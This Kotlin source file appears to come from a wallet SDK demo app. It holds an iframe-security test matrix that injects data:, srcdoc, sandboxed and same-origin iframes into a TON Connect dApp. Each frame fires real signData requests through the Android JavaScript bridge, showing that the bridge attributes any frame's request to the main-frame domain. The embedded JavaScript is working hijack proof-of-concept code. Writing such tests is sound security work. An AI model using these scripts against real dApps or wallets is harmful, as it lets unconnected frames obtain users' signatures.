/*
 * Copyright (c) 2025 TonTech
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
package io.ton.walletkit.demo.presentation.ui.screen.iframesec

import android.util.Base64

/**
 * Iframe-security matrix against the REAL WalletKit injected bridge on Android.
 *
 * Android security model (TonConnectInjector / TonConnectOperations): the injected bridge object
 * `AndroidTonConnect` is a @JavascriptInterface reachable from ALL frames and carries NO per-frame
 * origin. The native side derives the request `domain` from `webView.url` — i.e. the MAIN frame's
 * URL — for every frame. Consequently a request from ANY iframe (cross-origin data:, srcdoc,
 * sandboxed, …) is attributed to the connected main-frame domain and authorized.
 *
 * This is strictly weaker than iOS, where WKFrameInfo.securityOrigin gives a true per-frame origin
 * and cross-origin frames are rejected. The diagnostic `iframeSecLog` listener (addWebMessageListener)
 * shows the true per-frame origin for contrast, while the SDK event log shows the (main-frame)
 * domain the bridge actually attributed.
 */
enum class RealBridgeIframeCase {
    BASELINE_MAIN,
    SAME_ORIGIN_NAVIGATED,
    SAME_ORIGIN_NESTED,
    SAME_URL_IFRAME,
    CROSS_ORIGIN_DATA,
    SRCDOC,
    SANDBOXED,
    RAW_JS_INTERFACE,
    ;

    val shortTitle: String
        get() = when (this) {
            BASELINE_MAIN -> "Main"
            SAME_ORIGIN_NAVIGATED -> "Same-origin"
            SAME_ORIGIN_NESTED -> "Nested SO"
            SAME_URL_IFRAME -> "Same-URL"
            CROSS_ORIGIN_DATA -> "data:"
            SRCDOC -> "srcdoc"
            SANDBOXED -> "sandboxed"
            RAW_JS_INTERFACE -> "Raw JS iface"
        }

    val title: String
        get() = when (this) {
            BASELINE_MAIN -> "Baseline — main dApp frame (legit)"
            SAME_ORIGIN_NAVIGATED -> "Same-host navigated iframe"
            SAME_ORIGIN_NESTED -> "Nested same-host iframes — HIJACK"
            SAME_URL_IFRAME -> "Same-URL iframe (identical to main, ?qa=1) — HIJACK"
            CROSS_ORIGIN_DATA -> "Cross-origin data: iframe — HIJACK"
            SRCDOC -> "srcdoc iframe — HIJACK"
            SANDBOXED -> "Sandboxed iframe — HIJACK"
            RAW_JS_INTERFACE -> "Raw AndroidTonConnect from data: iframe — HIJACK"
        }

    val summary: String
        get() = when (this) {
            BASELINE_MAIN ->
                "Fires a real signData from the main dApp frame itself (the frame that connected). " +
                    "Reference for the legitimate path."
            SAME_ORIGIN_NAVIGATED ->
                "An iframe navigated to a path on the same host as the dApp. Its request is attributed " +
                    "to the dApp domain (webView.url) and authorized, though it never connected."
            SAME_ORIGIN_NESTED ->
                "A same-host iframe nested inside another same-host iframe (parent → A → B). The deepest " +
                    "frame fires a real signData; it is still attributed to the dApp domain and authorized."
            SAME_URL_IFRAME ->
                "An iframe whose src is the EXACT same URL as the main frame " +
                    "(https://tonconnect-sdk-demo-dapp.vercel.app/?qa=1) — an embedded copy of the dApp " +
                    "itself. Same origin, so its real signData is attributed to the dApp domain and authorized."
            CROSS_ORIGIN_DATA ->
                "Opaque-origin data: iframe sends a complete signData. On Android the bridge keys on " +
                    "webView.url, so it is attributed to the dApp domain and AUTHORIZED — the core hijack."
            SRCDOC ->
                "srcdoc iframe sends a real signData. Attributed to the dApp domain and authorized."
            SANDBOXED ->
                "sandbox=\"allow-scripts\" frame. If AndroidTonConnect is reachable, the request is " +
                    "still attributed to the dApp domain and authorized."
            RAW_JS_INTERFACE ->
                "A data: iframe calls window.AndroidTonConnect.postMessage(...) DIRECTLY (no provider). " +
                    "The @JavascriptInterface is exposed to every frame and carries no origin — the " +
                    "request is authorized as the main frame."
        }

    /** On Android every frame's request is attributed to webView.url, so the sheet is expected. */
    val expectsSheet: Boolean get() = true

    val expectation: String
        get() = "Expected on Android: native sign-data sheet APPEARS (bridge attributes the request " +
            "to webView.url — the main dApp domain — regardless of the frame's real origin)."

    /** JS evaluated in the dApp main frame: builds the topology and wires the real signData. */
    fun spawnJs(): String {
        val body = when (this) {
            BASELINE_MAIN ->
                """
                (function(){
                  var LBL='MAIN-DAPP';
                  function log(a,e){try{window.iframeSecLog.postMessage(JSON.stringify({frameLabel:LBL,action:a,claimedOrigin:(location.origin||'null'),payload:e||'',ts:Date.now()}));}catch(x){}}
                  var p=(window.ton&&window.ton.tonconnect)||(window.wallet&&window.wallet.tonconnect);
                  if(!p){log('NO PROVIDER IN MAIN FRAME');return;}
                  log('signData(real) from MAIN frame via provider →');
                  p.send({method:'signData',params:[JSON.stringify({type:'text',text:'Legit signData from main dApp frame'})],id:String(Date.now())})
                   .then(function(r){log('RESOLVED ✓ wallet signed',JSON.stringify(r).slice(0,180));})
                   .catch(function(e){log('REJECTED ✗',(e&&e.message?e.message:String(e)).slice(0,180));});
                })();
                """.trimIndent()

            SAME_ORIGIN_NAVIGATED -> {
                val script = realSendScript("SAME-ORIGIN-IFRAME", "Navigated to a path on the dApp host. Never connected.")
                """
                (function(){
                  var SRC=${jsString(script)};
                  var f=document.createElement('iframe');
                  ${frameStyle("f")}
                  f.src=${jsString(SAME_ORIGIN_URL)};
                  f.addEventListener('load',function(){
                    try{var d=f.contentWindow.document;var s=d.createElement('script');s.textContent=SRC;(d.body||d.documentElement).appendChild(s);}
                    catch(e){try{window.iframeSecLog.postMessage(JSON.stringify({frameLabel:'SAME-ORIGIN-IFRAME',action:'CANNOT INJECT (cross-origin?)',claimedOrigin:(location.origin||'null'),ts:Date.now()}));}catch(x){}}
                  });
                  __ifsecAdd(f);
                })();
                """.trimIndent()
            }

            SAME_ORIGIN_NESTED -> {
                // INNER runs in the deepest (depth-2) same-host frame and auto-fires signData.
                val inner = realSendScript("NESTED-IFRAME-B (depth 2, same host)", "Deepest same-host frame. Never connected.")
                // BUILDER runs in the middle (depth-1) frame: it creates the depth-2 same-host
                // iframe and injects INNER into it (same-origin chain, so contentWindow access works).
                val builder = """
                    (function(){
                      var INNER=${jsString(inner)};
                      var f2=document.createElement('iframe');
                      ${frameStyle("f2")}
                      f2.src=${jsString(SAME_ORIGIN_URL)};
                      f2.addEventListener('load',function(){
                        try{var d=f2.contentWindow.document;var s=d.createElement('script');s.textContent=INNER;(d.body||d.documentElement).appendChild(s);}catch(e){}
                      });
                      (document.body||document.documentElement).appendChild(f2);
                    })();
                """.trimIndent()
                """
                (function(){
                  var BUILDER=${jsString(builder)};
                  var f=document.createElement('iframe');
                  ${frameStyle("f")}
                  f.src=${jsString(SAME_ORIGIN_URL)};
                  f.addEventListener('load',function(){
                    try{var d=f.contentWindow.document;var s=d.createElement('script');s.textContent=BUILDER;(d.body||d.documentElement).appendChild(s);}
                    catch(e){try{window.iframeSecLog.postMessage(JSON.stringify({frameLabel:'NESTED-SO',action:'CANNOT INJECT (cross-origin?)',claimedOrigin:(location.origin||'null'),ts:Date.now()}));}catch(x){}}
                  });
                  __ifsecAdd(f);
                })();
                """.trimIndent()
            }

            SAME_URL_IFRAME -> {
                // iframe whose src is the exact same URL as the main frame (DAPP_URL, with ?qa=1).
                // Same origin, so we inject the real-send script into it via contentWindow.
                val script = realSendScript("SAME-URL-IFRAME", "Same URL as the main frame ($DAPP_URL). Never connected.")
                """
                (function(){
                  var SRC=${jsString(script)};
                  var f=document.createElement('iframe');
                  ${frameStyle("f")}
                  f.src=${jsString(DAPP_URL)};
                  f.addEventListener('load',function(){
                    try{var d=f.contentWindow.document;var s=d.createElement('script');s.textContent=SRC;(d.body||d.documentElement).appendChild(s);}
                    catch(e){try{window.iframeSecLog.postMessage(JSON.stringify({frameLabel:'SAME-URL-IFRAME',action:'CANNOT INJECT (cross-origin?)',claimedOrigin:(location.origin||'null'),ts:Date.now()}));}catch(x){}}
                  });
                  __ifsecAdd(f);
                })();
                """.trimIndent()
            }

            CROSS_ORIGIN_DATA -> {
                val html = selfContainedDoc("DATA-IFRAME", "Opaque origin. Never connected.")
                """
                (function(){
                  var f=document.createElement('iframe');
                  ${frameStyle("f")}
                  f.src=${jsString(dataUrl(html))};
                  __ifsecAdd(f);
                })();
                """.trimIndent()
            }

            SRCDOC -> {
                val html = selfContainedDoc("SRCDOC-IFRAME", "srcdoc — inherits parent origin in the browser sense.")
                """
                (function(){
                  var f=document.createElement('iframe');
                  ${frameStyle("f")}
                  f.setAttribute('srcdoc', ${jsString(html)});
                  __ifsecAdd(f);
                })();
                """.trimIndent()
            }

            SANDBOXED -> {
                val html = selfContainedDoc("SANDBOXED-IFRAME", "sandbox=allow-scripts. Opaque origin.")
                """
                (function(){
                  var f=document.createElement('iframe');
                  ${frameStyle("f")}
                  f.setAttribute('sandbox','allow-scripts');
                  f.setAttribute('srcdoc', ${jsString(html)});
                  __ifsecAdd(f);
                })();
                """.trimIndent()
            }

            RAW_JS_INTERFACE -> {
                val html = rawInterfaceDoc("RAW-JS-IFACE")
                """
                (function(){
                  var f=document.createElement('iframe');
                  ${frameStyle("f")}
                  f.src=${jsString(dataUrl(html))};
                  __ifsecAdd(f);
                })();
                """.trimIndent()
            }
        }
        return PANEL_PRELUDE + "\n" + body
    }

    companion object {
        const val DAPP_ORIGIN = "https://tonconnect-sdk-demo-dapp.vercel.app"
        const val DAPP_URL = "$DAPP_ORIGIN/?qa=1"
        const val SAME_ORIGIN_URL = "$DAPP_ORIGIN/iframe/iframe"

        private val PANEL_PRELUDE = """
            (function(){
              if(window.__ifsecAdd) return;
              function ensurePanel(){
                var p=document.getElementById('__ifsec_panel');
                if(!p){
                  p=document.createElement('div');
                  p.id='__ifsec_panel';
                  p.style.cssText='position:fixed;left:0;right:0;bottom:0;z-index:2147483647;max-height:55%;overflow:auto;background:rgba(20,20,22,.96);padding:8px;border-top:3px solid #ff3b30;box-sizing:border-box';
                  var bar=document.createElement('div');
                  bar.style.cssText='color:#fff;font:700 12px sans-serif;margin-bottom:6px';
                  bar.textContent='INJECTED ATTACK FRAMES';
                  p.appendChild(bar);
                  document.body.appendChild(p);
                }
                return p;
              }
              window.__ifsecClear=function(){var p=document.getElementById('__ifsec_panel');if(p)p.remove();};
              window.__ifsecAdd=function(node){ensurePanel().appendChild(node);};
            })();
        """.trimIndent()

        private fun frameStyle(v: String) = "$v.style.cssText='width:100%;border:0;min-height:150px;background:#fff;border-radius:8px;margin-top:6px';"

        /** A script that, run inside a frame, renders an overlay and auto-fires a real signData. */
        fun realSendScript(label: String, note: String): String =
            """
            (function(){
              var LBL=${jsString(label)}; var NOTE=${jsString(note)};
              function log(a,e){try{window.iframeSecLog.postMessage(JSON.stringify({frameLabel:LBL,action:a,claimedOrigin:(location.origin||'null'),payload:e||'',ts:Date.now()}));}catch(x){}}
              var box=document.createElement('div');
              box.style.cssText='font:13px sans-serif;background:#ffe5cf;color:#1d1d1f;padding:10px;border:2px solid #ff9b5b';
              box.innerHTML='<div style="font-weight:700;font-size:12px">'+LBL+'</div>'+
                '<div style="font:11px monospace;color:#444;margin:6px 0;word-break:break-all">origin: '+(location.origin||'null')+'<br>url: '+location.href+'</div>'+
                '<div style="font-size:11px;color:#7a3b00">'+NOTE+'</div>';
              (document.body||document.documentElement).appendChild(box);
              function realSend(){
                var appReq={method:'signData',params:[JSON.stringify({type:'text',text:'UNCONNECTED frame ['+LBL+'] @ '+location.href})],id:String(Date.now())};
                var p=(window.ton&&window.ton.tonconnect)||(window.wallet&&window.wallet.tonconnect);
                if(p){
                  log('signData(real) via provider →');
                  p.send(appReq).then(function(r){log('RESOLVED ✓ wallet signed',JSON.stringify(r).slice(0,180));})
                   .catch(function(e){log('REJECTED ✗',(e&&e.message?e.message:String(e)).slice(0,180));});
                  return;
                }
                var b=window.AndroidTonConnect;
                if(!(b&&b.postMessage)){log('NO PROVIDER AND NO AndroidTonConnect IN FRAME');return;}
                log('signData(real) via RAW AndroidTonConnect (no provider) →');
                try{ b.postMessage(JSON.stringify({type:'TONCONNECT_BRIDGE_REQUEST',messageId:'msg-'+Date.now(),method:'send',params:[appReq],frameId:(window.__tonconnect_frameId||('frame-'+Date.now()))})); log('raw posted (response not tracked)'); }
                catch(e){ log('raw post threw',String(e).slice(0,180)); }
              }
              setTimeout(realSend,500);
            })();
            """.trimIndent()

        /** Self-contained doc (data:/srcdoc/sandboxed) that embeds the real-send script. */
        private fun selfContainedDoc(label: String, note: String): String {
            val script = realSendScript(label, note)
            return "<!doctype html><html><head><meta charset=\"utf-8\">" +
                "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"></head>" +
                "<body style=\"margin:0\"><script>$script</script></body></html>"
        }

        /** A data: frame that ONLY uses the raw @JavascriptInterface — no high-level provider. */
        private fun rawInterfaceDoc(label: String): String {
            val script = """
                (function(){
                  var LBL=${jsString(label)};
                  function log(a,e){try{window.iframeSecLog.postMessage(JSON.stringify({frameLabel:LBL,action:a,claimedOrigin:(location.origin||'null'),payload:e||'',ts:Date.now()}));}catch(x){}}
                  var b=window.AndroidTonConnect;
                  var present=!!(b&&b.postMessage);
                  document.body.innerHTML='<div style="font:13px sans-serif;background:#ffd0d0;padding:10px;border:2px solid #ff5b5b">'+
                    '<div style="font-weight:700">'+LBL+'</div>'+
                    '<div style="font:11px monospace;color:#444">origin: '+(location.origin||'null')+'</div>'+
                    '<div style="font:11px monospace;color:#444">window.AndroidTonConnect present: '+present+'</div></div>';
                  log('AndroidTonConnect present in opaque frame: '+present);
                  if(!present){log('no @JavascriptInterface here');return;}
                  var appReq={method:'signData',params:[JSON.stringify({type:'text',text:'Raw @JavascriptInterface signData from data: iframe'})],id:String(Date.now())};
                  setTimeout(function(){
                    log('RAW AndroidTonConnect.postMessage(send signData) →');
                    try{ b.postMessage(JSON.stringify({type:'TONCONNECT_BRIDGE_REQUEST',messageId:'msg-'+Date.now(),method:'send',params:[appReq],frameId:'frame-raw'})); log('raw posted'); }
                    catch(e){ log('raw post threw',String(e).slice(0,180)); }
                  },500);
                })();
            """.trimIndent()
            return "<!doctype html><html><head><meta charset=\"utf-8\">" +
                "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"></head>" +
                "<body style=\"margin:0\"><script>$script</script></body></html>"
        }

        private fun dataUrl(html: String): String {
            val b64 = Base64.encodeToString(html.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
            return "data:text/html;charset=utf-8;base64,$b64"
        }

        /** Encode a Kotlin string as a JS string literal. */
        private fun jsString(s: String): String {
            val sb = StringBuilder("\"")
            for (c in s) {
                when (c) {
                    '\\' -> sb.append("\\\\")
                    '"' -> sb.append("\\\"")
                    '\n' -> sb.append("\\n")
                    '\r' -> sb.append("\\r")
                    '\t' -> sb.append("\\t")
                    else -> sb.append(c)
                }
            }
            sb.append("\"")
            return sb.toString()
        }
    }
}
